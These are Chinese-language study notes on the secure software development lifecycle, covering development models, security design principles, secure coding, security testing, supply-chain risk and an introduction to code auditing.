 

# 软件开发基本知识 

## 01.软件安全开发生命周期

### 软件安全开发生命周期

#### 软件生命周期模型

了解软件生命周期的概念及**瀑布模型**、**迭代模型**、**增量模型**、**快速原型模型**、**螺旋模型**、**净室模型**等典型软件开发生命周期模型。

#### 软件危机与安全问题 

了解三次软件危机产生的原因、特点和解决方案；

了解软件安全和软件安全保障的基本概念。

#### 软件安全生命周期模型

了解SDL、CLASP、CMMI、SAMM、BSIMM等典型的软件安全开发生命周期模型。

### 软件生命周期模型

#### 软件的定义

软件是与计算机系统操作有关的计算机程序、规程、规则，以及可能有的文件、文档及数据也就是一系列按照特定顺序组织的计算机数据和指令的集合也就是非有形部分，一般来讲软件被划分为系统软件、应用软件和介于这两者之间的中间件。

软件/系统并不只是包括可以在计算机（这里的计算机是指广义的计算机）上运行的电脑程序/WEB系统，与这些电脑程序/系统相关的文档一般也被认为是软件的一部分。

#### 软件生命周期模型

- 瀑布模型
- 迭代模型
- 增量模型
- 快速原型模型
- 螺旋模型
- 净室模型

##### 瀑布模型

最早出现的软件开发模型，是传统软件开发方法的代表

![image-20241029094524602](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029094524602.png)

###### 核心思想

按工序将问题简化

将功能的实现与设计分开

###### 不足

没有对开发周期后期发现错误做出相应的规定

没有迭代与反馈。瀑布模型对反馈没有涉及，所以对变化的客户需求非常不容易适应，瀑布就意味着没有回头路。

只允许开发人员回溯一个阶段

适用场景：需求固定，项目简单

![image-20241029094538647](https://image.201068.xyz/assets/软件开发基本知识V2.0/image-20241029094538647.png)

##### 迭代模型

- 瀑布模型的小型化应用
- 完整的工作流程
- 降低风险
  -  产品无法按期进入市场的风险
  - 增量开支的风险
- 加快开发进度
  -  任务清晰
  - 需求更容易随需而变

适用场景：需求难以确定、不断变更的软件系统

![image-20241029094610402](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029094610402.png)

##### 增量模型

- 融合了瀑布模型和迭代模型的特征
- 本质上是迭代，每个增量发布一个可操作产品

适用场景：技术风险大，用户需求较为稳定的软件系统。

![image-20241029094625567](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029094625567.png)

### 其他软件开发方法

#### 快速原型模型

快速原型模型又称原型模型，它是增量模型的另一种形式；它是在开发真实系统之前，构造一个原型，在该原型的基础上，逐渐完成整个系统的开发工作。

适用场景：需求复杂、难以确定、动态变化的软件系统

![image-20241029094650803](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029094650803.png)

#### 螺旋模型

- 兼顾快速原型的迭代的特征以及瀑布模型的系统化与严格监控。
- 引入了其他模型不具备的风险分析，使软件在无法排除重大风险时有机会停止，以减小损失。
- 构建原型是螺旋模型用以减小风险的途径

适用场景：需求难以获取和确定、软件开发风险较大的软件系统。

![image-20241029094706059](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029094706059.png)

#### 净室模型

净室是一种应用数学与统计学理论以经济的方式生产高质量软件的工程技术。

力图通过严格的工程化的软件过程达到开发中的零缺陷或接近零缺陷。

### 软件安全重要性-软件危机

#### 第一次“软件危机”-20世纪60年代

根源：日益庞大和复杂的程序对开发管理的要求越来越高。

解决：软件工程。

#### 第二次“软件危机”-20世纪80年代

根源：软件规模继续扩大，程序数百万行，数百人时开发，可维护性难

解决：面向对象语言-C++/java/c#

#### 第三次“软件危机”-21世纪头十年

根源：软件安全

解决：软件安全开发生命周期管理

### 软件安全问题产生

#### 软件缺陷普遍存在

CMMI全称是Capability Maturity Model Integration，即能力成熟度模型集成（也有称为：软件能力成熟度集成模型）

对企业非个人

##### 千行代码缺陷数量

![image-20241029094754875](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029094754875.png)

普通软件公司：4～40

高管理软件公司：2~4

美国NASA软件：0.1



##### 漏洞数量

![image-20241029094806986](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029094806986.png)



#### 内因

- 软件规模增大,功能越来越多,越来越复杂
- 软件模块复用，导致安全漏洞延续
- 软件扩展模块带来的安全问题

![image-20241029094830954](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029094830954.png)

- 互联网发展对软件安全的挑战
- 开发环境和开发人员对软件安全的挑战



1. 开发者缺乏安全开发的动机

- 市场和业务要求将交付期和软件功能做主要因素
- 用户方没有提供安全方面的压力

2. 开发者缺乏相关知识

- 软件复杂性加大，开发者需要学习更多东西
- 传统软件开发不进行安全教育

3. 缺乏安全开发工具

- 缺乏安全开发配套管理、测试等工具



### 软件安全保障

1. 贯彻风险管理的思想

软件不必是完美无缺的，但风险必须是可管理的

树立对软件安全控制的信心，该信心是通过保障活动来获取的

2. 通过在软件开发生命周期各阶段采取必要的、相适应的安全措施来避免绝大多数的安全漏洞

采取措施只能有效减少，但并不能完全杜绝所有的安全漏洞！



1. 软件安全开发覆盖软件整个生命周期

需求分析阶段考虑软件的安全需求

在设计阶段设计符合安全准则的功能

编码阶段保证开发的代码符合安全编码规范

安全测试和运行维护确保安全需求、安全设计、安全编码各个环节得以正确有效的实施

在软件的各个阶段引入安全措施！

### 软件安全问题越早解决成本越低

- 在软件开发生命周期中，后面的阶段改正错误开销比前面的阶段要高出数倍
- NIST(国家标准与技术研究所，美国的一家联邦机构)：在软件发布以后进行修复的代价是在软件设计和编码阶段即进行修复所花代价的30倍

![image-20241029095115266](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029095115266.png)

### 相关模型和研究

1. 多种模型被提出和研究

安全开发生命周期（微软SDL）

CLASP（OWASP）综合的轻量应用安全过程

CMMI软件能力成熟度集成模型

BSI系列模型（GaryMcGraw等）

SAMM（OWASP）软件保证成熟度模型

BSIMMBSI成熟度模型

#### SDL

1. 什么是SDL

安全开发生命周期（SecurityDevelopmentLifecycle，SDL）

2. SDL发展

![image-20241029095228498](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029095228498.png)

##### SDL的阶段和安全活动

- 七个阶段
- 十七项必需的安全活动

![image-20241029095445188](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029095445188.png)

##### SDL实施效果

1. 正式发布软件后12个月内的漏洞对比

IE：漏洞总数下降35%，高危漏洞数下降63%

![image-20241029095453346](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029095453346.png)

操作系统：漏洞总数降低45%

![image-20241029095501545](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029095501545.png)

#### CLASP

##### 什么是CLASP

综合的轻量应用安全过程（Comprehensive,LightweightApplicationSecurityProcess，CLASP）

用于构建安全软件的轻量级过程，由30个特定的活动(activities)和辅助资源构成的集合

针对这些活动给出了相应的指南、导则和检查列表

##### 特点

基于角色的安排

#### CMMI

##### 什么是CMMI

软件能力成熟度集成模型(CapabilityMaturityodelIntegration)

五级

![image-20241029095517995](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029095517995.png)


可以把CMMI看作是成功企业如何做好软件的一些习惯、做法、准则等的集合，是如何做好软件的最佳实践的集合。

#### SAMM

##### 什么是SAMM

软件保证成熟度模型（Software AssuranceMaturity Mode，SAMM）

提供了一个开放的框架，用以帮助软件公司制定并实施所面临来自软件安全的特定风险的策略

##### SAMM作用

- 评估一个组织已有的软件安全实践；
- 建立一个迭代的权衡的软件安全保证计划；
- 证明安全保证计划带来的实质性改善；
- 定义并衡量组织中与安全相关的措施。

##### 特点

###### 核心业务功能

治理、构造、验证、部署

![image-20241029095616869](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029095616869.png)

###### 成熟度级别

0~3

- 0:隐起点，措施尚未实现；
- 1:对安全实践有了初步了解并有所专门的提供；
- 2:提高了安全实践的效率和（或）有效性；
- 3:在一定规模上综合掌握了安全实践

#### BSI系列模型

##### BSI(Building Security IN)

使安全成为软件开发必须的部分

强调应该使用工程化的方法来保证软件安全

##### 软件安全的三根支柱

风险管理：策略性方法

接触点：一套轻量级最优工程化方法，攻击与防御综合考虑

安全知识：强调对安全经验和专业技术进行收集汇总，对软件

![image-20241029095722925](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029095722925.png)

#### BSIMM

##### BSI成熟度模型

- 对真实的软件安全项目所开展的活动进行量化
- 构建和不断发展软件安全行动的指南

![image-20241029095757492](https://image.201068.xyz/assets/软件开发基本知识V2.0/image-20241029095757492.png)

#### 各模型比较

![image-20241029085318742](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029085318742.png)

#### 威胁建模

##### 什么是威胁建模

威胁建模是了解系统面临的安全威胁，确定威胁风险并通过适当的缓解措施以降低风险，提高系统安全性的过程。

##### 为什么要威胁建模

- 帮助在设计阶段充分了解各种安全威胁，并指导选择适当的应对措施
- 对可能的风险进行管理
- 可以重新验证其架构和设计

- 有助于软件的受攻击面降低

##### 威胁建模流程

- 确定对象
- 识别威胁
- 评估威胁
- 消减威胁

![image-20241029095841252](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029095841252.png)

###### 确定对象

确定要保护和评估的目标（资产）

在使用实例和应用场景中分析

明确应用或系统的关键威胁场景、部署方式、配置信 息、用户使用方式等

场景示例

创建一个系统来收集销售人员的会计文件，在数据库服务器上计算销售收据，并生成每周报表。该系统目标很简单：从一组系统中获取文件，并在一台中央服务器上对文件进行一定的分析。这是客户所要求的业务目标。

场景数据

流图DFD图

![image-20241029100451672](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029100451672.png)

###### 识别威胁

识别每一个可能面临的威胁

- 理解软件可能面临的威胁是安全开发的前提

- 威胁不是漏洞

- 威胁永远存在

![image-20241029100538931](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029100538931.png)

理解STRIDE六类威胁

![image-20241029100558495](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029100558495.png)

###### 评估威胁

评估威胁风险值

- 评估被利用和攻击发生的概率

- 评估攻击后资产的受损后果，并计算风险

- 比较简单的直接使用ALE（年度预期损失）来评价

- 危险=发生概率×潜在的损失。


###### 消减威胁

- 重新设计并排除这个威胁

- 使用标准的威胁消减技术

- 发明新的消减方法

- 根据安全Bug标准来确定是否可接受风险

- 把威胁作为漏洞记录下来，以后再想办法消减


要想办法消减每个威胁！

## 02.软件安全需求及设计

### 安全需求分析

#### 安全需求分类

- 安全功能需求

- 安全保障需求


#### 需求分析的要点

- 安全需求进行有效定义

- 不仅考虑系统功能，还要考虑系统不应该做什么

- 功能需求、安全需求、安全目标要达到平衡

![image-20241029100723148](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029100723148.png)

### 需求分析过程

- 系统调查

- 定性分析系统的脆弱点和可能遭受的安全威胁

- 脆弱点和安全威胁的定量分析

- 需求的确定

![image-20241029100758546](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029100758546.png)

### 安全设计的重要性

#### 安全编码？安全测试？

- 传统方法：软件发布后测试、等待修复Bug

- GaryMcGraw：50%的安全问题由设计瑕疵引起

- 安全提前介入，效益高，成本低

![image-20241029100815755](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029100815755.png)

#### 设计缺陷——举例

MicrosoftBob

明文存储口令，甚至将口令拿到客户端对比验证

### 软件安全设计

#### 安全概要设计阶段

包括但不限于：安全体系结构设计、各功能块间的处理流程、与其  他功能的关系、安全协议设计、安全接口设计等。

#### 安全详细设计阶段

详细设计阶段作为安全功能的程序设计阶段，应当直接指导安全功能的编码工作。

包括但不限于：模块设计、内部处理流程、数据结构、输入/输出项、算法、逻辑流程图等。

![image-20241029100835858](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029100835858.png)

### 安全设计的主要活动

- 详细风险评估

- 控制措施选择

- 安全技术实现

- 安全设计评审


### 安全设计原则

1. 最小特权原则

2. 权限分离原则

3. 最少共享机制原则

4. 完全中立原则

5. 心理可接受度原则

6. 默认故障处理保护原则

7. 经济机制原则

8. 不信任原则

9. 纵深防御原则

10. 保护最薄弱环节原则

11. 公开设计原则

12. 隐私保护原则

13. 攻击面最小化原则


#### 最小特权原则

##### 作用：

降低被攻击后果，使影响范围有限

##### 实现：

- 评估完成操作索需要的最小权限

- 只授予用户或进程执行操作所必需的最小权限

- 只在需要的时候提升权限，当条件满足时允许提升权限


##### 示例：

以nobody身份运行的Apache 

Linux中为每个部署的系统创建所属的角色

#### 权限分离

##### 作用：

防止利益冲突，防止不法行为、欺诈、滥用职权以及错误等

防止误操作、操作失败等问题

##### 实现：

软件不同组件，用户不同角色

分配不同的任务给不同职位的人，或者在多个人间针对某个特定的安全操作过程分配相关的特权

##### 范例：

1、系统中用户角色管理：在一个企业管理系统中，用户被分为多个角色，如管理员、财务人员和普通员工。

管理员可以创建、编辑和删除用户，而普通员工只能查看自己的信息。这样的角色划分确保了不同角色只能执行特定操作，避免了权限滥用。

2、软件项目中不同环境的管理：在软件开发过程中开发和生产环境的分离，开发人员与运维人员应有不同的权限。

开发人员可以对代码进行更改，但不能直接访问生产环境的数据库。运维人员则负责生产环境的管理，但不能随意修改代码。这种分离确保了代码更改和生产环境的稳定性。

#### 最小共享

##### 作用：

避免敏感信息泄漏

提供多用户访问灵活性，并避免竞争冲突

##### 实现：

为每个请求建立独立资源

##### 示例：

Oracle数据库为每个库创建一个实例

Apache每个请求创建一个进程

#### 完全中立

##### 作用：

避免权限滥用

##### 实现：

每次主体对资源的请求，系统都应该实行认证和执行检查

##### 示例：

修改密码前还需要验证一次原密码

#### 心理可接受度

##### 作用：

用户不会对安全机制抵制从而禁用相关机制

##### 实现：

美观的用户界面及使用操作

明确的安全功能说明

##### 示例：

一键杀毒、一键XX......

#### 默认故障

##### 作用：

软件故障也不会带来其他安全问题

##### 实现：

考虑系统失效和故障时的机制

##### 示例：

1、在金融应用中，如果交易处理出现问题，系统默认将交易回滚，而不是进行部分处理。这避免了资金损失或错误转账。

2、服务器访问出现问题，也不会提示服务器的型号、版本等信息。

#### 纵深防御

##### 作用：

不把安全依赖于某一项机制

##### 实现：

对一个安全问题提供多项防御机制

##### 示例：

帐户锁定策略&密码策略&登录随机验证码。

制定和测试灾难恢复计划，确保在发生重大安全事件或自然灾害时，能够快速恢复关键系统和数据。业务连续性计划确保在系统受到攻击时，仍能保持基本业务功能。

#### 公开设计

##### 作用：

将安全依赖于攻击者无法了解机制，而应该使攻击者即时知道机制也无法带来安全问题

##### 实现：

使用成熟可靠的技术

设计上不依赖于攻击者无法掌握某些特定信息来保护自己的安全是不可靠

##### 示例：

基于密钥的安全

#### 降低攻击面

##### 作用：

攻击面越小，安全风险越小

##### 实现：

取消不需要的功能

增加对功能的安全防护

##### 示例：

关闭不必要的API或服务接口，只保留对外开放的必要部分。通过API网关进行流量管理，确保只有授权请求可以访问特定接口。

定期对代码进行安全审计和静态分析，发现并修复潜在的安全漏洞。通过代码审查和同行评审，增强代码的安全性和可靠性。

#### 分析软件攻击面

分析产品功能的重要性（是否必须）

分析从哪里访问这些功能（本地&远程）

分析访问权限（匿名&经过认证）

![image-20241029101247082](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029101247082.png)

#### 降低攻击面策略

重要等级为低的功能：攻击面大，取消该功能

重要等级为中的功能：攻击面大，设置为非默认开启，需要用户配置后才予以开启

重要等级为高的功能：攻击面大，关闭或限制一些接口方式，增加一些安全的保证措施或技术

![image-20241029101304574](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029101304574.png)

##### 降低软件攻击面通常做法

![image-20241029090121700](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029090121700.png)

## 03.软件安全实现

### 通用安全编码原则-验证输入

1. 对**所有输入数据**进行检查、验证及过滤


- 应用软件的“数据防火墙”，避免恶意数据进入


2. 什么时候验证

- 最初接收数据时

- （第一次）使用数据时

- 采用黑名单或者白名单的方式


### 验证输入-常见输入源

- 命令行

  - 参数数量、数据格式、内容

- 环境变量

  - 环境变量可能超出期望

  - 有的环境变量长度过长、内容篡改、格式不符

- 文件及文件名

  - 不信任可以被不可信用户控制的文件内容

  - 检查文件长度、格式、内容

  - 不同系统对文件名的要求也是不一样的

- 网络

  - 来自网络的数据是“高度不可信的”

  - 数据本身和网络包包头

- 其他


### 通用安全编码原则

#### 避免缓冲区溢出

1. 缓冲区溢出

- 缓冲区：包含相同数据类型的实例的一个连续计算机内存块

- 溢出：数据被添加到分配给该缓冲区的内存块之外


2. 外部数据比目标空间大

3. 是一个非常普遍而且严重的问题

![image-20241029101535229](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029101535229.png)

4. 溢出后果

攻击者可以使远程服务程序或者本地程序崩溃

攻击者可以设计溢出后执行的代码

5. C/C++语言

语言特性决定

大量的库函数存在溢出

6. 其他语言

调用C语言库

`C#`允许设置“不安全”例程

#### 程序内部接口安全

程序内部接口数据的检查

检测异常，安全处理各种可能运行路径

检测到某些错误行为/数据，必须以合适的方式处理，保证程序运行安全

必要时立即拒绝服务，甚至不回送详细的错误代码

#### 程序内部安全

1. 最小化反馈

避免给予不可靠用户过多的信息

​	成功或失败

​	作为跟踪检查的日志可以记录较为详细的信息

认证程序在认证前尽量少给信息

如果程序接受了密码，不要返回它

2. 避免竞争条件

访问共享资源时（文件/变量）没有被适当地控制

使用原子操作

使用锁操作——避免死锁

3. 安全使用临时文件

#### 安全调用组件

1. 应用程序实际上几乎都不会是自包含的，它们通常都会调用其他组件
   底层的操作系统
   数据库
   可重用的库
   网络服务（WEB、DNS）

2. 使用安全组件，并且只采用安全的方式
   检查组件文档，搜索相关说明

   ​	gets

   ​	随机数

   使用经过认可的组件
   尽可能不调用外部命令，如果不得已要调用，必须严格检查参数

   ​	system、open、exec、

#### 安全调用组件

1. 正确处理返回值
   一定要检查返回值，调用是否成功
   成功时检查

   ​	返回值，是否按照期望值处理

   ​	数据中可能含有NUL字符、无效字符或其他可能产生问题的东西
   错误时检查

2. 保护应用程序和组件之间传递的数据
   视安全需求和安全环境

   ​	考虑传输加密，包括密码算法和安全协议

#### 禁用不安全函数

编码中禁止使用的危险函数举例：

```bash
#C语言：
gets()、strcpy()、strcat()、sprintf()、scanf()、system()、strtok()

#C++语言：
std::strcpy() 和 std::strcat()、std::sprintf()、std::getline()、std::vector::reserve() 和 std::vector::resize()、std::auto_ptr

#java语言：
Runtime.exec() 和 ProcessBuilder、ObjectInputStream.readObject()，System.exit()
```

### 软件安全编译

#### 确保运行环境的安全

将软件运行环境基于较新版本的系统

#### 确保编译环境的安全

使用最新版本编译器与支持工具

可靠的编译工具

使用编译器内置防御特性

### 源代码审核

#### 什么是源代码审核

通过分析或检查源程序的语法、结构、过程、接口等来检查程序的正确性，报告源代码中可能隐藏的错误和缺陷

#### 源代码审核方式

人工审核（费时费力、容易遗漏）

#### 工具审核

速度快，自动

可升级知识库

![image-20241029102212860](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029102212860.png)

## 04.软件安全测试

### 软件测试

#### 什么是软件测试

使用人工和自动化的手段来运行或测试某个系统的过程，其目的在于检验它是否满足规定的需求或是弄清预期结果与实际结果之间的差异

#### 基本概念

测试用例：

​	一组特殊的测试输入，执行条件和预期结果

测试覆盖率度量指标

​	基于需求的覆盖

​	基于代码的覆盖

### 软件测试的基本概念

#### 测试的信条

- 预期测试的测试结果是预先确定的

- 好的测试用例发现错误的概率高
- 成功的测试就是发现了错误的测试
- 测试独立于编码
- 需要具备应用（用户）及软件（编程）两方面的专业知识
- 测试人员使用不同于开发人员的工具
- 只检查常见的测试用例是不够的
- 测试文档要能够再利用



#### 软件测试方法/阶段

- 出厂测试、冒烟测试、单元测试、集成测试、系统测试、验收测试

- 黑盒测试、白盒测试、灰盒测试

- 静态测试、动态测试

  代码走查、代码审查、代码评审

- 回归测试、生产接受测试

### 软件测试阶段

#### 出厂测试

##### 定义：

出厂测试也称FAT测试，是指在供应商的场所进行的测试，主要验证系统或设备的设计、制造和功能符合预定的规格，识别潜在问题和缺陷，以便在交付前进行修复。

##### 目的：

确保每个单元按预期工作，能够处理各种输入并返回正确输出。主要是基于白盒测试。（也就是说，在单元测试过程中，用的最多的是白盒测试方法，也可能会有灰盒或者黑盒。单元测试和白盒测试是不同的划分，不存在包含关系）。

#### 单元测试

##### 定义：

单元测试，又称模块测试。对软件的组成单位进行测试，其目的是检验软件基本组成单位的正确性。测试的对象是软件里测试的最小单位：模块。

##### 目的：

确保模块的连通性，保证有正常的输入以及正常的输出，主要是基于白盒测试。

#### 集成测试

##### 定义：

集成测试是在单元测试之后，对多个单元（通常是模块或组件）进行组合测试，以验证它们的接口和交互是否正常。

##### 目的：

识别模块(服务)之间的接口问题和数据流问题，确保不同模块能够协同工作。

#### 系统测试

##### 定义：

系统测试是在集成测试完成后进行的，目的是在整个系统环境中测试系统的功能和性能。

##### 目的：

验证系统是否符合需求规格，评估系统的整体功能、性能、安全性和可靠性。

#### 系统集成测试

##### 定义：

系统集成测试是对整个系统及其与外部系统的集成进行的测试，确保各个部分之间的交互正常。

##### 目的：

验证系统与外部环境的集成情况，包括与外部接口、系统和服务的交互。

#### 回归测试

##### 定义：

回归测试是在系统/软件修改后，对先前测试过的功能进行重新测试，以确保修改没有引入新的缺陷。

##### 目的：

确保现有功能在软件更新或修复后依然正常工作。

#### 验收测试 UAT

##### 定义：

验收测试又称为用户验收测试`(UAT`)是由最终用户或客户进行的测试，以验证软件是否符合他们的需求和业务要求。

##### 目的：

确保软件在真实环境中能够正常工作，并满足用户的期望。UAT通常是在开发完成后、正式上线前进行。

#### 生产接受测试 PAT

##### 定义：

生产接受测试(`PAT`)又称为准生产测试，验证即将投入生产环境的系统或应用程序是否满足预定的业务需求和性能标准。

`PAT`通常在系统上线之前进行，确保软件在真实环境中能够正常运行，并满足用户和业务的期望。

##### 目的：

确保系统的功能、性能和质量，降低上线风险，并提高用户满意度。

### 软件测试方法

#### 黑盒测试

##### 定义：

这种测试方法实际是把测试对象看成是一个拆不开的物件，测试人员不清楚物件里程序内部逻辑结构和内部特性，只能依据程序/系统的需求说明书，检查程序的功能是否符合说明书所述的输入条件和输出结果。

##### 目的：

评估软件的功能是否符合用户要求和业务逻辑。

#### 白盒测试

##### 定义：

这种测试方法实际是把测试对象看成是一个拆散了的物件，测试人员把整个物件完全拆开，可以看到里面程序内部逻辑结构和所有信息，针对内部结构进行设计或选择测试用例，对程序所有逻辑进行测试，通过在各种不同的测试用例检查程序状态，确定实际状态是否与预期的状态一致。

##### 目的：

验证代码的执行路径、逻辑和条件，通常用于单元测试和集成测试。

#### 灰盒测试

##### 定义：

是介于白盒测试与黑盒测试之间的一种测试，灰盒测试多用于集成测试阶段，不仅关注输出、输入的正确性，同时也关注程序内部的情况。

灰盒测试不像白盒那样详细、完整，但又比黑盒测试更关注程序的内部逻辑。

##### 目的：

由于测试人员对系统的内部结构有一定了解，可以更有效地发现不同模块之间的集成问题。

在系统修改或升级后，灰盒测试可以帮助验证新版本是否引入了新的缺陷，确保系统的稳定性和可靠性。

### 软件安全测试

#### 什么是软件安全测试

确定软件的安全特性实现是否与预期设计一致的过程

有关验证软件安全等级和识别潜在安全缺陷的过程

查找软件自身程序设计中存在的安全隐患，并检查应用程序对非法侵入的防范能力

#### 为什么需要软件安全测试

传统测试仅考虑软件出错时的处理，没有考虑对软件的故意攻击

### 软件安全测试方法

1. 在应用投产前，应由独立的安全团队对应用的安全性进行综合评估

- 功能性安全测试
- 对抗性安全测试

2. 安全测试方法

- 模糊测试

- 渗透测试

- 静态源代码审核


#### 模糊测试（Fuzzing）

##### 什么是模糊测试

也称Fuzzing测试，一种通过提供非预期的输入并监视异常结果来发现软件故障的方法

黑盒测试，不关心被测试目标的内部实现，而是利用构造畸形的输入数据引发被测试目标产生异常，从而发现相应的安全漏洞

##### 模糊测试

1. 强制软件程序使用恶意/破坏性的数据并进行观察结果的一种测试方法

- 不够强壮的程序会崩溃
- 编码良好的程序正常运行

2. 特性

- 方法学
- 随机值
- 大量测试用例
- 查找漏洞或可靠性错误

##### 模糊测试过程

- 生成大量的畸形数据作为测试用例；
- 将这些测试用例作为输入应用于被测对象；
- 监测和记录由输入导致的任何崩溃或异常现象；
- 查看测试日志，深入分析产生崩溃或异常的原因；

![image-20241029102954000](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029102954000.png)

##### 影响模糊测试效果的关键因素

- 测试点

  ​	数据通道入口、可信边界点、外界传入文件、rpc端口

- 样本选择

  ​	选择覆盖面广、便于测试的多个样本

- 数据关联性

  ​	智能模糊测试

- 自动化框架

- 异常监控与异常恢复

- 分析评估

#### 渗透测试

##### 渗透测试

通过模拟恶意攻击者进行攻击，来评估系统安全的一种评估方法

从攻击的角度测试软件系统是否安全

使用自动化工具或者人工的方法模拟攻击者的输入，找出运行时刻目标系统所存在的安全漏洞

##### 优点

找出来的问题都是真实的，也是较为严重的

##### 缺点

只能到达有限的测试点，覆盖率较低

##### 渗透测试流程

![image-20241029103108912](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029103108912.png)

##### 渗透测试要点

- 测试目的

  安全性的评估，不是摧毁或破坏

- 测试人员

  技术、知识和经验很重要

  像“坏人”一样思考问题

- 安全问题

  系统备份和恢复措施

  风险规避

![image-20241029103134726](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029103134726.png)

#### 灵活安排自己的“组合”

##### 必须完整的遵循“安全开发”过程吗？

- 代码审核 + 体系结构风险评估
- 基于风险的安全测试 + 渗透测试
- 安全需求分析 + 滥用案例开发
- 代码审核 + 渗透测试
- 体系结构风险分析 + 基于风险的测试
- …

### 软件安全测试思路

- 充分了解软件安全漏洞

  设计、实现、部署三个环节同时着手

- 评估软件安全风险

  安全性缺陷数据评估

  漏洞植入法评估

- 拥有高效的软件安全测试技术和工具

## 05.软件安全交付

### 软件供应链安全

1. 供应链安全概念

目前软件安全开发生命周期中新的威胁，涉及到软件的代码编写、代码编译、软件分发、软件更新

代码编写：共享库

代码编译：被污染的编译软件

软件分发/更新：污染源头

2. 供应链安全应对策略

安全流程覆盖到引入的第三方代码中

可靠的编译软件获取方式--XcodeGhost事件

3. 官方渠道、发布验证

### 软件验收及部署

#### 软件验收

正式的验收流程

安全纳入到验收考虑中

#### 安全部署

提供软件部署所需要的文档和工具

软件加固

软件安全配置

## 06.案例分析

### 案例分析

背景：某上市公司A拥有一套成熟CRM(客户关系管理系统)，经过与潜在客户B公司接触，通过售前等商业行为顺利中标，中标后客户B会和中标公司A签署合同，此时项目正式启动。

#### 1、需求分析：

项目启动之后第一步重要的工作就是去收集客户方B公司的具体需求编写需求文档，需要与客户进行需求的评审，确认需求文档的准确性和完整性。要根据需求文档绘制出系统的原型图，一般需求人员会带领开发人员一起。

产出物：系统的最终版需求文档、系统的原型图。

![image-20241029103336912](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029103336912.png)

![image-20241029103648339](https://image.201068.xyz/assets/5.软件开发基本知识/image-20241029103648339.png)

#### 2、系统设计：

根据需求文档和系统原型图进行架构设计、详细设计(模块、数据库、界面、重要的业务逻辑实现)并对设计内容进行多次评审。

现在的项目一般为多个端，比如PC端(WEB端)、手机端(安卓、IOS)、小程序端(微信、支付宝等)，这个就涉及到团队的协作与沟通在设计时还要考虑用户的交互以及体验感，所以设计阶段非常重要。

产出物：文档，多端系统架构，数据库，UI界面等。

#### 3、系统开发：

该阶段主要的目的是要将设计转换为实际代码的过程。一般管理人员会按照模块进行划分，然后UI、前端以及后端的开发人员进行编码、联调最终要形成单元测试报告。

产出物：代码、测试文档。

#### 4、系统测试：

测试人员要根据不同的测试阶段结合需求说明以及详细设计文档等对要测试的模块进行测试用例的编写包括正例，反例等。

根据编写的测试用例对已经开发并且进行单元测试的模块进行用例测试。

产出物：各个测试阶段的测试文档。

#### 5、系统交付：

在测试通过后，进入系统交付阶段，包括

交付文档：准备相关的交付文档，如用户手册、安装指南、维护手册等。

系统部署：将系统部署到客户的环境中，确保系统可以正常运行。

产出物：手册、文档、系统。

#### 6、系统验收：

系统验收是客户对交付系统进行检查和确认的过程，包括：

验收测试：客户根据验收标准对系统进行测试，确认系统功能和性能符合要求。

验收文档：记录验收结果，并形成验收报告，确认系统的最终交付。

产出物：文档。

#### 7、系统实施：

在系统验收通过后，进入系统实施阶段，包括：

用户培训：对客户的用户进行培训，确保他们能够熟练使用新系统。

上线支持：在系统上线初期提供技术支持，解决用户在使用过程中遇到的问题。

后期维护：根据客户需求，进行系统的后续维护和更新，确保系统的长期稳定性和安全性。

产出物：培训记录等。

## 07.代码审计

### 代码审计

##### 引言：

随着互联网的高速发展，各类新型 Web 攻击层出不穷。NIST（美国国家标准与技术研究院）的研究表明，在软件开发生命周期中，在软件发布以后进行修复的代价是在软件设计和编码阶段即进行修复所花代价的 30 倍，所以在软件系统发布后才发现系统缺陷，然后再去进行修复，这样的代价是很大的。

如何在软件系统发布前找到 Web 应用系统存在的隐藏漏洞已成为众多企业普遍面临的问题。

对于渗透测试人员来说，掌握代码审计应是一项基本技能，只有懂得了漏洞的原理以及产生的过程，才能够根据具体漏洞环境的变化写出符合实际需求的攻击代码进行渗透。

对于代码审计人员，只有充分挖掘当前代码中可能存在的安全问题，才能使开发人员了解其开发的应用系统可能会面临的威胁，并正确修复程序缺陷。

在网络安全竞赛中有一个常见考点：由源代码泄露产生的代码审计。这在实际攻防渗透中也很常见，即由于系统配置或管理员的错误操作而导致系统的源代码泄露。

除了源代码泄露，在实战中另外一个场景是目标站点使用了某套开源系统，这时我们除了查找此开源系统已公开的相关漏洞，还有一个十分有效的攻击手法是对此开源系统进行代码审计，以发现未知的漏洞，通过未知漏洞进行攻击。

代码审计需要通过阅读源代码的方式找到隐藏的安全问题，因此代码审计对渗透测试人员的编程能力有一定的要求，而最基础的要求是能够读懂代码逻辑、读懂代码的功能。

#### 什么是代码审计：

代码审计(Code Audit)是一种以发现安全漏洞、程序错误和程序违规为目标的源代码分析技能。

